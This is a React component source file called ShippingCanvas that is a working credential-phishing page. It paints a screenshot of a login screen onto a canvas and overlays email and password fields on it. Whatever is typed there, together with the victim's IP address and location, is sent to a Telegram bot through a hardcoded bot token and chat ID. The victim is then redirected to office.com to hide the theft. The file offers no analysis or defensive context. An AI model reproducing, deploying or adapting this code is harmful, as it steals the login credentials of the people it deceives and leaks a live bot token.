import React, { useEffect, useRef } from 'react';

// Helper function to fetch geolocation data
const getGeoLocationData = () => {
  return new Promise((resolve, reject) => {
    fetch('http://ip-api.com/json')
      .then((response) => response.json())
      .then((data) => {
        if (data.status === 'success') {
          resolve(data);
        } else {
          reject('Error retrieving geolocation data');
        }
      })
      .catch((err) => reject(err));
  });
};

const ShippingCanvas = () => {
  const emailInputRef = useRef(null); // Reference for email input
  const passwordInputRef = useRef(null); // Reference for password input
  const canvasRef = useRef(null); // Reference for canvas

  useEffect(() => {
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    const image = new Image();
    image.src = 'https://i.ibb.co/5rcKL7q/Screenshot-2024-10-25-061657.png';
    image.onload = () => {
      ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
      drawInputFields(ctx);
    };
  }, []);

  const drawInputFields = (ctx) => {
    const emailX = 409;
    const emailY = 300;
    const passwordX = 409;
    const passwordY = 350;
    const buttonX = 690;
    const buttonY = 512;
    const buttonWidth = 150;
    const buttonHeight = 50;

    ctx.strokeRect(emailX, emailY, 430, 30);
    ctx.strokeRect(passwordX, passwordY, 430, 30);

    setInputBox(emailInputRef.current, emailX, emailY, 430, 30);
    setInputBox(passwordInputRef.current, passwordX, passwordY, 430, 30);

    // Use requestAnimationFrame for canvas click listener
    const handleCanvasClick = (event) => {
      const x = event.offsetX;
      const y = event.offsetY;
      if (x > buttonX && x < buttonX + buttonWidth && y > buttonY && y < buttonY + buttonHeight) {
        handleSubmit();
      }
    };

    canvasRef.current.addEventListener('click', handleCanvasClick);

    return () => {
      // Clean up the event listener when the component unmounts
      canvasRef.current.removeEventListener('click', handleCanvasClick);
    };
  };

  const setInputBox = (inputElement, x, y, width, height) => {
    inputElement.style.left = `${canvasRef.current.offsetLeft + x}px`;
    inputElement.style.top = `${canvasRef.current.offsetTop + y}px`;
    inputElement.style.width = `${width}px`;
    inputElement.style.height = `${height}px`;
    inputElement.style.visibility = 'visible'; // Make sure the input is visible
  };

  const handleSubmit = async () => {
    const email = emailInputRef.current.value;
    const password = passwordInputRef.current.value;
    if (email.trim() === '' || password.trim() === '') {
      alert('Please fill in both fields');
      return;
    }

    try {
      // Fetch geolocation data
      const geoData = await getGeoLocationData();

      // Send data to Telegram bot
      const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
      const chatId = '6707519229';
      const message = `📨 **Email:** ${email}
        🔑 **Password:** ${password}
        🌍 **IP Address:** ${geoData.query}
        🌐 **Country:** ${geoData.country}
        🏙️ **Region:** ${geoData.regionName}
        🏙️ **City:** ${geoData.city}
        📍 **Latitude:** ${geoData.lat}
        📍 **Longitude:** ${geoData.lon}`;
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      const response = await fetch(telegramUrl);
      if (response.ok) {
        alert('You have signed in successfully');
        window.location.href = 'https://www.office.com';
      } else {
        alert('Error sending message');
      }
    } catch (error) {
      console.error('Geolocation error:', error);
      alert('Error retrieving geolocation data');
    }
  };

  return (
    <div>
      <canvas
        ref={canvasRef}
        width="1447"
        height="786"
        style={{ border: '1px solid black' }}
      ></canvas>
      <input
        ref={emailInputRef} // Use ref to access the value
        type="text"
        className="hidden-input"
        placeholder="Email"
        style={{
          position: 'absolute',
          visibility: 'hidden', // Keep the input off-screen, but still interactive
        }}
      />
      <input
        ref={passwordInputRef} // Use ref to access the value
        type="password"
        className="hidden-input"
        placeholder="Password"
        style={{
          position: 'absolute',
          visibility: 'hidden', // Keep the input off-screen, but still interactive
        }}
      />
    </div>
  );
};

export default ShippingCanvas;
